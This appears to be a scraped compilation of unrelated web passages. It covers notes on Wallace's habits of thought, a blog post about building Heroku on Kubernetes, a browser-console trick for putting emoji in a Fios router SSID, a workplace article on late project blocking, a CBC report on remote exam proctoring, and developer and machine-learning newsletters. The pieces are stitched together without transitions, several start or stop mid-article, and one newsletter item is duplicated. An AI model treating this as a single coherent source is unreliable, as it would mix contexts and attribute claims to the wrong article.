  <p>Both the successful trains of association, which might have led to the ‘flash’ of success, and the final and successful train are normally either unconscious or take place (with ‘risings’ and ‘fallings’ of consciousness as success seems to approach or retire), in that periphery or ‘fringe’ of consciousness which surrounds our ‘focal’ consciousness as the sun’s ‘corona’ surrounds the disk of full luminosity.</p>
</blockquote>

<p>Another essential idea is that that a mental activity once carried on will also leave our organism more prone to repeat that activity in the future.</p>
    
      <h3 id="habits-or-actions-to-stimulate-mental-processes">
        
        
          Habits or actions to stimulate mental processes <a href="#habits-or-actions-to-stimulate-mental-processes">#</a>
        
        
      </h3>

<p>Wallace also proposes some actions to stimulate going into mental activity:</p>

<ol>
  <li>
<em>“Associative thought to a time-stimulus”</em> - if you do a mental activity every day at the same hour after a while, you will be able to go directly to focus (you will be warmed up to do the action that you wanted)</li>
  <li>
<em>“Habit of responding to a particularly sensory stimulus”</em> - it might be that some environment (the place you are, what it is in the room, etc.) are better at stimulating a type of mental activity</li>
  <li>
<em>“Daily repeated muscular action stimulates the memory of the thought-train”</em> - it might work to start your process by rereading what you wrote before.</li>
  <li>
<em>“Stimulus of breaking habit”</em> - he also warns that we should not become “slaves of our habits,” and he even suggests that in case you have used one of the habits described above for five days to change it with another one in the six-day.</li>
  <li>Start by working on <em>“what could be put off and leave till later what could not be put off”</em>. This allows you to focus on <em>“some question which, without a special effort of volition, we should be inclined to put off, a problem with slightly uncomfortable associations, or an inchoate train of still vague and only partially conscious thought”</em>
</li>
  <li>
<em>“Habit of watching the unfocussed fringe of their consciousness for any significant mental events which may appear there”</em>, should be accompanied by the habit of writing them down as they are without forcing yourself to give them a specific form or to elaborate them.</li>
  <li>
<em>“Habit of oral lecturing and seminar-teaching”</em> - where Wallace suggests that the ideas grow to each other when you are focusing on presenting them to an audience. You should go ahead and present to an audience (without reading from a paper) and be sure to note any ideas that might come into your mind during the presentation or afterward.</li>
</ol>
    
      <h3 id="more-about-writing-down-thoughts-and-ideas">
        
        
          More about writing down thoughts and ideas <a href="#more-about-writing-down-thoughts-and-ideas">#</a>
        
        
      </h3>

<p>It seems essential for an excellent thinker to keep track of different thoughts and ideas. Wallace suggests in this book some ways to handle this:</p>

<ul>
  <li>Write down ideas as they come, at the moment they arrive and in the form they come. Do not delegate for later the writing because you might lose them or forget them. Do not try to shape them, for you might interrupt a train of associations and loose some important though at the end.</li>
  <li>Once per week, reread these notes and try to connect them with your current work.</li>
  <li>If there is no connection with current work, then file the idea into a separate folder that Wallace names <em>“Redistribute”</em>, where you will put all these thoughts that seem important but do not belong elsewhere.</li>

                    <p><a href="https://heroku.com/">Heroku</a> sucks. Now before you jump out of your seat, hear me out. Heroku makes deploying applications dead simple. If you or a startup asked for a platform recommendation, I would pick Heroku in a heartbeat. Then what’s the problem? Well, Heroku <a href="https://www.heroku.com/pricing">pricing</a> sucks.</p><p>I love to tinker. I build apps to test product ideas weekly. But spending $7 per app to validate my ideas with Heroku is a huge turn off. Heroku has a free tier but your apps sleep after 30 minutes of inactivity depending on your remaining free dyno hours.</p><p>If an app took off then at minimum I will have a $100 monthly bill. Not to mention I would have to optimize for limited compute resources if I want to keep my bill low. There are other alternatives, but none of them have a comparable developer experience. Use their <a href="https://www.heroku.com/pricing">price estimator</a> if you don’t believe me.</p><p>The price debate always raises a question. Is it possible to save money by hosting my own Heroku-like platform? I can’t say for sure but I want to find out. Put simply, let’s tinker and flex those creativity muscles.</p><p>Today we kickoff the first post in a Heroku-on-Kubernetes series. Over the next few weeks I’ll document my journey as I explore how to build a Heroku platform on Kubernetes. I’ll share with you progress updates, system design plans, code snippets, and costs. </p><p>When I’m done, I’ll combine all these resources into a streamlined video you can watch to build your platform in a few hours. Then we’ll answer the question: can we save money by self-hosting Heroku?</p><p>Standups are a powerful tool for software development sprints. Let’s use the same format to track the development of our Heroku platform. </p><p><strong>What did you do yesterday or last session?</strong> Over the weekend I spent two hours working on a prototype to prove Heroku on Kubernetes platform is possible. Happy to report the prototype works. I built a <a href="https://cloud.google.com/kubernetes-engine">GKE</a> cluster using <a href="https://cloud.google.com/compute/vm-instance-pricing">preemptible e2-standard-4</a> worker nodes to save on prototyping costs. I installed <a href="https://knative.dev/">Knative</a> with <a href="https://istio.io/latest/">Istio</a> to configure a serverless container runtime. I deployed a sample application. I made a request to the application, and got a working response. Then, I tore down the infrastructure to save money until the next session. Last session cost me $0.31 on Google Cloud.</p><p><strong>What will you do next session?</strong> Next I plan to mockup the main user workflows. The workflows will mirror the Heroku developer experience. I’ll use <a href="https://www.figma.com/">Figma</a> since it's an easy to use design tool.</p><p><strong>What’s blocking you? </strong>No blockers.</p><p><strong>What questions do you have?</strong> I recently learned you can deploy <a href="https://linkerd.io/2020/03/23/serverless-service-mesh-with-knative-and-linkerd/">Knative with Ambassador and Linkerd</a>. (Thank you <a href="https://twitter.com/wm">William</a> for the <a href="https://twitter.com/wm/status/1277434336774504448?s=20">tip</a>!) I wonder if I should spend time testing this setup. I’m more familiar with these components which reduces the number of tools I would need to learn. However, the Ambassador integrations is in the alpha stage. I might run into undocumented issues. </p><p>I know what I will do, but what should I work on next?</p><p>Join the mailing list to stay updated with the series. Hope you’re excited about this project!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"> <article>   <p>Setting the name/SSID of your WiFi to an emoji is fairly simple for the Fios Home Router. Simply log into the router, and go the page for setting the SSID.</p> <p>Once you are there open the developer console using <code>Ctrl+Shift+I</code> or by right clicking and clicking the option labeled along the lines of <code>Inspect Element</code> or <code>Inspect</code>. After this simply paste the following code into the console.</p> <div><div><pre><code><span>validSSID</span> <span>=</span> <span>function</span><span>(){</span><span>return</span> <span>true</span><span>}</span>
</code></pre></div></div> <p>This overrides the current validSSID function which is used to make sure that your SSID is made of the Fios required 1-32 alphanumerical ascii characters. This is not an actual technical requirements for SSIDs with the 2012 standard of 802.11 (Section 6.3.11.2.2) stating SSIDs simply have to be a max of 32 bytes. Once this script is ran you should be able to type anything less than 32 bytes. This tends to be at most 32 characters, but depending on the size of the Unicode characters used it can be much less. For instance the fire emoji, <code>🔥</code>, is actually 4 bytes because of how UTF-8 works. This means that only 8 fire emojis could be used. To get the size of a string simply use the site <a href="https://mothereff.in/byte-counter">https://mothereff.in/byte-counter</a>.</p> <p>Have fun setting unusal SSIDs</p> <hr> <p> Hello reader. I do not normally like to put advertisements or promotions on my website, but recently a good friend of my Jaden Ann Scrivener died in a car crash. She was known in the community as the most caring and energetic person around. She was a beam of sunshine and happiness brightening up the day of anyone who interacted with her.

<![CDATA[Stop Blocking Things at the Last Minute]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>One of the most frustrating and common experiences in the workplace is getting work blocked near the finish line. Examples:</p>
<ul>
  <li>A feature is developed over the course of 3 months. In the launch meeting a manager swoops in and declares it can’t be released for security reasons.</li>
  <li>You ask your manager for feedback on a proposal. They don’t respond. You ask again. They give a cursory glance and say “looks good”. A week later you say you’re ready to send it out. Suddenly they flood the document with feedback which ruins your timeline.</li>
  <li>An entire division works on a project for weeks. The minute they make it live the VP of the division storms in and yells “revert!”. The VP is displeased with the styling and insists it can’t be shipped that way.</li>
</ul>

<p>There’s usually one of 3 main causes for this anti-pattern:</p>
<ul>
  <li>Problem 1: Laziness/mis-calculation/ego. The stakeholder thinks it’s more efficient for them to engage with something closer to the finish line than early stage. This is often a gross mis-calculation. Projects are like cruise ships - you want to get to your destination with a lot of little steering along the way, not heroics after things have veered off course.</li>
  <li>Problem 2: Bad process. A critical stakeholder isn’t procedurally involved at the right time. If you find yourself blocking projects regularly, it’s your responsibility to fix this. <a href="https://staysaasy.com/process/2020/04/06/Creating-Good-Process.html">Create good process</a>.</li>
  <li>Problem 3: Micromanagement. The project/proposal didn’t actually need the manager’s feedback, they just can’t help having to put their stamp on everything.</li>
</ul>

<p>The solutions are simple but hard to master:</p>
<ul>
  <li>Answer 1: If you don’t think you need to be involved early, imagine the project goes live without your feedback at all. If you’re comfortable with that, you probably don’t need to be involved early (or at all). If you do need to give feedback, do it early and along the way.</li>
  <li>Answer 2: Make sure you have a process that involves necessary stakeholders at the right time.</li>
  <li>Answer 3: Don’t micromanage.</li>
</ul>

<p>If you mess up and find yourself giving major feedback near the finish line of a project, find ways to say yes and make sure you’re empathizing with the frustration that’s resulting from the late stage changes.</p>



<p>Some people actually take pride in blocking projects. Stakeholders who repeatedly view themselves as “saving the day” when it comes to tanking momentum and releases. They see themselves as a fountain of unique knowledge that prevent disasters.</p>

<p>This is almost always a result of incentives that are grossly mis-aligned. Some organizations have stakeholders who show up late in the game, who are not responsible for other teams being productive, who have 0 incentive to facilitate work and all the incentive to block things.</p>

<p>Companies should incentivize these stakeholders not only for preventing problematic releases, but also for the amount of things teams can get done to their requirements.  This ties their success to both risk management and enablement.</p>

"I just felt like it needs to be in the middle ground. This is just way too extreme."</p>  <h2>University conducting pilot&nbsp;</h2>  <p>In a June 25 memo to teaching staff in the University of Ottawa's faculty of social sciences, vice-dean of undergraduate studies Marc Molgat states that the university has recently acquired an online proctoring system through Respondus.</p>  <p>Despite that memo, in a written response, administrators wouldn't confirm to CBC that the university is using Respondus products, and would only confirm it's&nbsp;pilot testing some form of remote proctoring software.</p>  <p>"Rest assured that privacy and the protection of personal information will be of primary concern to us when assessing available tools. We will ensure to inform our community in due time," wrote Isabelle Mailloux Pulkinghorn, the university's media relations manager.</p>  <p>She added that students will be asked for their consent and professors will be free to choose if they use remote proctoring tools. If a student decides not to consent, their professor would then need to find an alternate way to evaluate them.&nbsp;</p>  <p>"At this point, there isn't much that we can add," said Mailloux Pulkinghorn.</p>  <p>However, the university's own technical support website for instructors and students contains several paragraphs explaining how Respondus Monitor records video and audio of a student during a test, then analyzes the student's actions, including eye movement.</p>  <p><span><figure><div><p><img alt="" srcset="https://i.cbc.ca/1.5620668.1592627398!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/sarah-elaine-eaton.jpg 300w,https://i.cbc.ca/1.5620668.1592627398!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/sarah-elaine-eaton.jpg 460w,https://i.cbc.ca/1.5620668.1592627398!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/sarah-elaine-eaton.jpg 620w,https://i.cbc.ca/1.5620668.1592627398!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/sarah-elaine-eaton.jpg 780w,https://i.cbc.ca/1.5620668.1592627398!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/sarah-elaine-eaton.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5620668.1592627398!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/sarah-elaine-eaton.jpg"></p></div><figcaption>Sarah Elaine Eaton, an assistant professor at the University of Calgary, says post-secondary institutions are locked in an 'arms race' to procure remote proctoring technology designed to prevent cheating.<!-- --> <!-- -->(Supplied by Clayton MacGillvray)</figcaption></figure></span></p>  <p>In a statement to CBC Ottawa, Respondus CEO David Smetters wrote "the architecture for LockDown Browser and Respondus Monitor is designed with protection of student privacy as a basic requirement."</p>  <p>He compared students using&nbsp;webcams for an exam to taking part in&nbsp;a Zoom or Microsoft Teams session.</p>  <p>"It's up to the university to decide whether the benefit of using webcams for online learning outweighs the privacy concern raised by students."</p>  <h2>Equity also a concern</h2>  <p>Beyond the privacy concerns, experts in university cheating have also raised the issue of equity when it comes to requiring students to film themselves during exams.&nbsp;</p>  <p>University of Calgary assistant professor Sarah Elaine Eaton, whose area of research is academic integrity, says many universities have been scrambling to address a jump in cases of academic fraud since the start of the COVID-19 pandemic.&nbsp;</p>  <p>"Some of them have sort of gone to a great arms race to get an online proctoring tool that's available to them," said Eaton. "That presents a number of complexities for students, and that some students don't have the technology or they don't have access to a stable internet&nbsp;[connection]."</p>  <p>Eaton said she also worries remote proctoring software and other programs designed to catch cheaters are reducing the role teachers play in fighting academic fraud.&nbsp;</p>  <p>"I caution against turning to technology as a solution to complex ethical problems," she said. "We've seen over and over again that instructors still need to be part of the conversation."</p></span></p></div></div>]]>

<h3>If it’s your first time here… (otherwise, skip this part)</h3>
<p>Being a Python developer is a fantastic career option. Python is now the most popular language with lots of growing job demand (especially in the fields of Web, Data Science and Machine Learning). You have many job opportunities, you can work around the world, and you get to solve hard problems. One thing that is hard, however, is staying up to date with the constantly evolving ecosystem. You want to be a top-performing python developer, coder, programmer, software developer, but you don’t have time to select from hundreds of articles, videos and podcasts each day.</p>
<p>This monthly newsletter is focused on keeping you up to date with the industry, keeping your skills sharp, without wasting your valuable time. I will be sharing the most important articles, podcasts and videos of the month. Think <a href="https://tim.blog/about" target="_blank" rel="nofollow">Tim Ferriss</a> and <a href="https://en.wikipedia.org/wiki/Pareto_principle" target="_blank" rel="nofollow">the Pareto Principle</a> (80/20 rule) meeting the Software Development world. What’s the 20% that will get you 80% of the results?</p>

<h3>What you missed in June as a Python Developer…</h3>
<hr>
<h3>Ultimate Python Debugging 🐛</h3>
<p>Nobody writes perfect code. Half the time, you are spending your time debugging your programs, so it is always a good time to invest in learning the proper way to debug your python code. Lucky for you, <a href="https://martinheinz.dev/blog/24" target="_blank" rel="nofollow">this article helps you out</a>.</p>
<p>While you are at it, also learn about <a href="https://www.blog.pythonlibrary.org/2020/06/17/python-101-exception-handling-2/" target="_blank" rel="nofollow">Python Error Handling</a>. </p>
<h3>A Free Python Course 🦄</h3>
<p>A pretty in depth <a href="https://dabeaz-course.github.io/practical-python/Notes/Contents" target="_blank" rel="nofollow">Python course</a> that tries to cover some of the basics of Python in written form. A productive little thing to do over the weekend or dive into a specific topic you are curious about.</p>
<h3>Dependency Management ⛲️</h3>
<p>Dependency management is a big topic for all programming languages. Python has one of the more complex dependency management out there, so it is no surprise that there are many ways of doing it. <a href="https://modelpredict.com/python-dependency-management-tools" target="_blank" rel="nofollow">Here is a breakdown</a> of the most common/best ways of going about this hard problem. </p>
<h3>The Best Flattener 🥌</h3>
<p><a href="https://chrisconlan.com/fastest-way-to-flatten-a-list-in-python/" target="_blank" rel="nofollow">I love articles like these</a> that don't necessarily make a HUGE impact in your programming ways, but do show you that there are many options out there for doing things. Remember, performance is only one of the factors in deciding what is <em>"good"</em> (i.e. think about readability too).</p>
<h3>How To Build A Large Project 🏄</h3>
<p>A great overview of potential ways to structure your Python Monorepos so that it scales well. It is not always about micro services, and sometimes Monorepos may be the answer for your large scale application. <a href="https://medium.com/opendoor-labs/our-python-monorepo-d34028f2b6fa" target="_blank" rel="nofollow">Have a read here</a>.</p>
<h3>Weekend Project Idea 🎏</h3>
<p><a href="https://www.linisnil.com/articles/scraping-roger-ebert-reviews-and-amazon/" target="_blank" rel="nofollow">This is a fun project</a> for you to build yourself this weekend using some Python Scraping <em>(pick your favourite movie critic)</em>. Bonus points if you make this into a web app or a voice skill for Alexa or Google Home.</p>
<p>Ok, just because I like you, <a href="https://blog.twitter.com/developer/en_us/topics/tips/2020/how-to-analyze-the-sentiment-of-your-own-tweets.html" target="_blank" rel="nofollow">here is another idea</a> in case you don't like the first one.</p>
<h3>What Are Enums? 📚</h3>
<p>Enum stands for enumeration and refers to a set of symbolic names, which are called enumeration members. Huh? They are essentially a data structure that can be very useful and an important one to add to your Python skills. So have a <a href="https://florian-dahlitz.de/blog/why-you-should-use-more-enums-in-python" target="_blank" rel="nofollow">read here</a> to learn all about them.</p>
<h3>Python Best Practice Bites 🥞</h3>
<p>A bunch of quick code snippets to demonstrate Python best practices that you can learn right away. <a href="https://livecodestream.dev/post/2020-06-08-make-your-code-great-python-style/" target="_blank" rel="nofollow">Enjoy</a>.</p>
<h3>Master NumPy 🤖</h3>
<p>NumPy is one of the most popular Python libraries that gets heavily used in the Machine Learning and Data Science space. [In this interactive tutorial],(<a href="https://mathtocode.com/" target="_blank" rel="nofollow">https://mathtocode.com/</a>) you get to learn all about NumPy by solving math problems <em>(it's a lot more fun than it sounds)</em>.</p>
<h3>PEP618 - zip() 🤐</h3>
<p>New PEP adds an optional length checker to the <code>zip()</code> function to avoid the common errors that you get when combining lists of different lengths. Have a read through the documentation <a href="https://www.python.org/dev/peps/pep-0618/#examples" target="_blank" rel="nofollow">here</a>.</p>
<h3>To Pickle or Not To Pickle 🥒</h3>
<p>Pickle is a very unique to Python. But should you always use it? In some cases, it may not be the best option, so you should be aware of these <a href="https://nedbatchelder.com/blog/202006/pickles_nine_flaws.html" target="_blank" rel="nofollow">9 flaws</a>.</p>
<h3>Github Is Taking Over 🗿</h3>
<p>Github's latest Actions <em>(ha! get it?)</em> have really shown the powerhouse that it is. Now, they announced <a href="https://github.blog/2020-06-18-introducing-github-super-linter-one-linter-to-rule-them-all/" target="_blank" rel="nofollow">Github Linter</a>. A Github super linter that will lint all your code with no need for you to build your own linting pipeline. Things are becoming better and better with Github and I don't see why we shouldn't be using all their tools in one place.</p>

I will be sharing the most important articles, podcasts and videos of the month.

<h3>History Of Search Engines 👾</h3>
<p>Nope...It isn't not just Yahoo, Bing and Google. <a href="https://carlhendy.com/history-of-search-engines/#top" target="_blank" rel="nofollow">This in-depth article</a> talks about the deep history of search engines and I guarantee there will be at least one thing in there that you didn't know <em>(I learned plenty when reading this)</em>. Enjoy!</p>
<h3>JetBrains Developer Survey 🗳</h3>
<p>My second favourite developer survey just released their results to show you what the developer market is doing. Python and JavaScript are still the champs. <a href="https://www.jetbrains.com/lp/devecosystem-2020/" target="_blank" rel="nofollow">Check it out for more insights</a>.</p>
<h3>Denofy 🗺️</h3>
<p>It's no secret that I am a <a href="https://academy.zerotomastery.io/p/deno-the-complete-guide-zero-to-mastery" target="_blank" rel="nofollow">big fan of Deno</a> and its future potential. <a href="https://github.com/garronej/denoify" target="_blank" rel="nofollow">Here is a great library</a> that takes Node modules and converts them to Deno so you can have all that community goodness in your Deno projects.</p>

<h3>MDN 💔 Angular</h3>
<p>Mozilla Developer Network which is the defacto place for all JavaScript documentation for the web has new sections on Frameworks and Libraries. <a href="https://developer.mozilla.org/en-US/docs/Learn/Tools_and_testing/Client-side_JavaScript_frameworks/React_getting_started" target="_blank" rel="nofollow">They have tutorials now on React, Vue and Ember</a>... but nothing for Angular...hmm wonder why?</p>
<p>But, whatever. Angular doesn't need them. <a href="https://blog.angular.io/version-10-of-angular-now-available-78960babd41" target="_blank" rel="nofollow">They just announced Angular 10</a>!</p>
<h3>Not Another Performance Article 🛸</h3>
<p>Ugh... ANOTHER performance article. But before you just brush this one off, it's actually a pretty good article showing you the process of analyzing performance and improving it beyond just doing super specific niche things for a measly 1% performance gain. <a href="https://3perf.com/blog/notion/" target="_blank" rel="nofollow">Actually recommend you read this</a>.</p>
<h3>Grid God/Godess 🏗</h3>
<p>Next time you want to present data inside of a grid/sheet style display on your website, there is no need to use anything else but this easy to use library. I wish I knew about this earlier: <a href="https://gridjs.io/" target="_blank" rel="nofollow">Grid.js</a></p>
<h3>Port Scanning Shenanigans  🔬</h3>
<p>Although <a href="https://blog.nem.ec/2020/05/24/ebay-port-scanning/" target="_blank" rel="nofollow">this is a security article</a>, it actually teaches you a useful skill of how to analyze obfuscated JavaScript on any website. Trust me, you will learn something new and interesting by reading this article.</p>
<p>PS. Here is a fun review of how to <a href="https://pixelprivacy.com/resources/how-to-encrypt-your-traffic/" target="_blank" rel="nofollow">encrypt your internet traffic</a> to stay safe out there. </p>
<h3>Relational VS Mongo 🌿</h3>
<p>The age old debate around Relational vs non Relational databases. HSBC just moved a bunch of their relational databases to MongoDB and Hackernews had a field day bashing them about it. <a href="https://news.ycombinator.com/item?id=23507197" target="_blank" rel="nofollow">A fun/educational read through the comments</a>. </p>
<p>If you want to geek out on latest Database advances, check out <a href="https://lucperkins.dev/blog/new-db-tech-1/" target="_blank" rel="nofollow">this article</a> for some of the exciting things happening in the space.</p>
<h3>JavaScript Project Ideas 🏟</h3>
<p>We recently released a new course in our online coding academy: <a href="https://academy.zerotomastery.io/p/javascript-projects" target="_blank" rel="nofollow">20 JavaScript projects to add to your portfolio</a> and sharpen your JS knowledge. </p>
<p>You should check it out. But if you don't want to, here is a <a href="https://music-grid.surge.sh/#0-0-0-16-0-0-0-0-64-0-40-0-256-128-512-1024-&amp;200" target="_blank" rel="nofollow">fun weekend project idea for you to build on your own</a>.</p>

...and this one: <a href="https://riccardoscalco.it/textures/" target="_blank" rel="nofollow">Textures.js</a></p>
<h3>Bootstrap 5 is here 🌪</h3>
<p>Bootstrap is still around and hanging on strong. Although it may not be "new and sexy" it is a library that is designed very well that makes you productive. They just came out with <a href="https://blog.getbootstrap.com/2020/06/16/bootstrap-5-alpha/" target="_blank" rel="nofollow">version 5</a>! I will be updating my <a href="https://academy.zerotomastery.io/p/complete-web-developer-zero-to-mastery" target="_blank" rel="nofollow">Web Development course</a> once it is out of alpha stages this year with this newer version. </p>
<h3>What Is DevOps? 🥁</h3>
<p>We keep hearing this term, but would you be able to explain it in just a few sentences? The short answer is that DevOps is more of an ideology than an actual role. However, <a href="https://stackoverflow.blog/2020/06/10/the-rise-of-the-devops-mindset/" target="_blank" rel="nofollow">this article</a> will break down its rise and what it all means much better than I can.</p>
<h3>How To Make Money on Github 🏦</h3>
<p>An interesting business model if you want to make money on Github and open source projects. Open source profitability is tough, but <a href="https://calebporzio.com/i-just-hit-dollar-100000yr-on-github-sponsors-heres-how-i-did-it" target="_blank" rel="nofollow">this person</a> seems to have found a way to do this successfully using the Github Sponsors model. Expect more of these stories to come out.</p>
<h3>Quick Web Accessibility 🔮</h3>
<p><a href="https://blog.segunolalive.com/posts/how-web-accessibility-works/" target="_blank" rel="nofollow">A nice short overview</a> of how Web accessibility works and some of the things you should be doing for best practices.</p>
<h3>Let's Talk TypeScript 🗝</h3>
<p>There is no question that TypeScript is a big part of the Web Development world now. In this article, we get to learn some of its history and where it is going. TypeScript really took off when Angular announced they would be using it for their project back in the day, and it hasn't stopped since. <a href="https://stackoverflow.blog/2020/06/15/talking-typescript-with-ryan-cavanaugh/" target="_blank" rel="nofollow">Enjoy some insights from this interview</a>.</p>
<h3>Github Is Taking Over 🗿</h3>
<p>Github's latest Actions <em>(ha! get it?)</em> have really shown the powerhouse that it is. Now, they announced <a href="https://github.blog/2020-06-18-introducing-github-super-linter-one-linter-to-rule-them-all/" target="_blank" rel="nofollow">Github Linter</a>. A Github super linter that will lint all your code with no need for you to build your own linting pipeline. Things are becoming better and better with Github and I don't see why we shouldn't be using all their tools in one place.</p>
<h3>Container History 🧱</h3>
<p><a href="https://blog.coinbase.com/container-technologies-at-coinbase-d4ae118dcb6c" target="_blank" rel="nofollow">This was a really interesting article from Coinbase</a>. They discuss the history of containers, where we came from, and the current landscape (i.e. Kubernetes). Even if you aren't working with these technologies directly, it's a great overview of the container landscape and some of the reasons you may need/not need Kubernetes.</p>
<h3>Refactor vs Rewrite 👹 👺</h3>
<p>Software is never perfect. With time, all code needs to be re-factored or re-written. But which options should you chose? <a href="https://remesh.blog/refactor-vs-rewrite-7b260e80277a" target="_blank" rel="nofollow">This article</a> does a great job talking about the tradeoffs and when the rare occasions are when you want to do a full rewrite.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><strong>6th issue! If you missed them, you can <a href="https://zerotomastery.io/blog/?tag=MLM">read the previous issues of the Machine Learning Monthly newsletter here</a>.</strong></p>
<p>🤖<strong>Welcome to Machine Learning Monthly</strong>... one of the best ways to get started in the industry. The first part of this series is about solving problems in machine learning. The second part is about how to use machine learning to solve problems in machine learning. In this post, I'll introduce you to a number of new machine learning algorithms that I've been working on for the last year or so. I'll also cover some of the more common problems and techniques that you'll find as you learn about machine learning. I will also be discussing the various problems that you'll encounter in machine learning, and the ways that you can learn them in this series.</p>
<hr>
<p>Woah... The above paragraph was completely artificially generated. I fed a machine learning algorithm known as <a href="https://github.com/openai/gpt-2" target="_blank" rel="nofollow">GPT-2</a> (check out #2 below) the words "welcome to machine learning monthly" and it completed the rest. </p>
<p>Anyway, back to people generated words (I promise).</p>
<p>Hey everyone, Daniel here, I'm 50% of the instructors behind the <a href="https://academy.zerotomastery.io/p/complete-machine-learning-and-data-science-bootcamp-zero-to-mastery" target="_blank" rel="nofollow">Complete Machine Learning and Data Science: Zero to Mastery</a> course. </p>
<p>This is the sixth edition of Machine Learning Monthly. A 500ish word post detailing some of the most interesting things on machine learning I've found (or made) in the last month. </p>
<p>Let’s get into it.</p>

<h3>What you missed in June as a Machine Learning Engineer…</h3>
<hr>
<h2>My posts</h2>
<ul>
<li><a href="https://www.mrdbourke.com/how-can-a-beginner-data-scientist-like-me-gain-experience/" target="_blank" rel="nofollow">“How can a beginner data scientist like me gain experience?”</a> — Manuela emailed me this question and I replied with a few things I think you’ll find useful. The main one being: start the job before you have it.</li>
<li><a href="https://www.mrdbourke.com/how-i-got-tensorflow-developer-certified/" target="_blank" rel="nofollow">How I passed the TensorFlow developer certification (and how you can too)</a> — During May I set myself up with a curriculum to sharpen some of my TensorFlow skills. All with the goal of taking the <a href="https://www.tensorflow.org/certificate" target="_blank" rel="nofollow">TensorFlow developer certification</a> at the start of June. I took the exam and passed. So I put together an article (and video) of resources and techniques that I used to do it.</li>
</ul>
<h2>1. <a href="https://dbourke.link/mlmap" target="_blank" rel="nofollow">Machine Learning Roadmap 2020</a></h2>
<p>When starting out machine learning, it can be hard to connect the dots. From the different machine learning tools, to the process of working on a machine learning project, to the different kinds of evaluation metrics you need for each problem.</p>
<p>The <a href="https://dbourke.link/mlmap" target="_blank" rel="nofollow">Machine Learning Roadmap 2020</a> (actually a big interactive mind map) connects many of the most important concepts, as well as resources for learning more about each of them.</p>
<p>More specifically, it covers (broadly):</p>
<ol>
<li><strong>Machine learning problems</strong> — how to diagnose a machine learning problem.</li>
<li><strong>Machine learning process</strong> — once you’ve identified a machine learning problem, what steps can you take to solve it?</li>
<li><strong>Machine learning tools</strong> — what tools are available to you to solve the problem?</li>
<li><strong>Machine learning mathematics</strong> — since machine learning is largely using math to find patterns in numbers, what subfields of math are running under the hood of the machine learning algorithm you‘re calling?</li>
<li><strong>Machine learning resources</strong> — alright, so the above has sparked your curiosity, how do you learn these things? This part has you covered.</li>
</ol>
<p>I’m so excited for this. I think you’ll love it.</p>

<p>PS. Stay tuned for a full 2.5 hour video version coming soon which will premiere on the <a href="https://www.youtube.com/channel/UCt7T2EvYBqvlxNU3fbE4Y7g" target="_blank" rel="nofollow">Zero To Mastery Youtube Channel</a>. Subscribe now so that you don't miss it!</p>
<h2>2. <a href="https://github.com/minimaxir/aitextgen" target="_blank" rel="nofollow">aitextgen</a> — Leverage OpenAI's GPT-2 architecture to generate text</h2>
<p>I spent an hour or so playing around with this. You can get up and running in under 5-minutes on Google Colab (just follow the instructions in the GitHub repo). </p>
<p>Max Woolf makes some really cool things and this might be my favourite yet.</p>
<p>Out of the box, <a href="https://github.com/minimaxir/aitextgen" target="_blank" rel="nofollow">aitextgen</a> leverages OpenAI's 124M parameter version of GPT-2 (for context, the biggest one available is 1.5B parameters) to take in a seed, such as, "welcome to machine learning monthly" and then it artificially generates text up to your desired length (using the max_length parameter).</p>
<p>You can even train the model on your own text to generate something flavoured with your style (perhaps it could read all of your old blog posts and generate a new one for you?).</p>
<p>As text generation gets better and better, it'll be an interesting time when you could effectively run a social media account with purely AI-generated text.</p>
<h2>3. <a href="https://magenta.tensorflow.org/coconet" target="_blank" rel="nofollow">Using AI to play like Bach</a></h2>
<p>As if generating text with AI wasn't enough to fuel your artistic dreams. How about using AI to generate music in the style of Bach (a famous German composer)?</p>
<p>Last year, Google did just that with their <a href="https://www.google.com/doodles/celebrating-johann-sebastian-bach" target="_blank" rel="nofollow">Google Doodle</a>. They trained a machine learning model (called Coconet) on 306 of Bach's compositions and created an interactive demo where you can enter your own music notes and have them artificially harmonized (turned into something that sounds pretty good).</p>
<p>I'm liking this theme. </p>
<p>AI generated art is definitely becoming a thing. If you never fancied yourself a musician but you can code, now you can write code to play the music for you.</p>
<p>The <a href="https://magenta.tensorflow.org/coconet" target="_blank" rel="nofollow">blog post that went along with</a> it is also truly worth the read.</p>
<h2>4. <a href="https://dfrieds.com/articles/data-science-reality-vs-expectations.html" target="_blank" rel="nofollow">Data science: expectations vs. reality</a></h2>
<p>Dan Friedman attended a 12-week data science bootcamp in 2016, during which ML &amp; AI was everywhere in the news. However, after some experience in the field, he found his expectations didn't meet reality.</p>
<p>In particular, some takeaways include:</p>
<ul>
<li>People don't know what "data science" does (it's more than just running machine learning algorithms)</li>
<li>Most ML projects don't make it into production</li>
<li>Data &amp; data infrastructure tools are lacking (data in industry is different to data you find in books &amp; Kaggle competitions)</li>
</ul>
<p>The last two are very real. Building a model these days is becoming very approachable, however, getting it into people's hands is the real challenge.</p>
<p>Enter, MLOps.</p>
<h2>5. <a href="https://huyenchip.com/2020/06/22/mlops.html" target="_blank" rel="nofollow">What the hell is MLOps anyway?</a></h2>
<p>So you want to get your machine learning model out into the world?</p>
<p>Well then, you'll probably want to familiarize yourself with MLOps (short for machine learning operations). If you're familiar with DevOps, MLOps is the same but with machine learning thrown in the mix.</p>
<p>In essence, MLOps is all the things you need around your machine learning model so users can interact with it.</p>
<p>It's a combination of: a data pipeline (a way to collect and prepare data), a machine learning model (the fun part) and a way to serve that machine learning model (a web or mobile application or API).</p>
<p>A few years ago, deploying a machine learning model was like black magic. Some (outside of large tech companies) had heard of it and even less had done it.</p>
<p>Now though, the tools in the space of getting your machine learning creation to the world are growing and the good thing is, <a href="https://huyenchip.com/2020/06/22/mlops.html" target="_blank" rel="nofollow">Chip Huyen has written a fantastic blog post</a> reflecting on what she learned by going through 200+ (yes, two-hundred plus) of them.</p>
<p>Check it out and use what you learn to get your machine learning models in the hands of people around the world.</p>
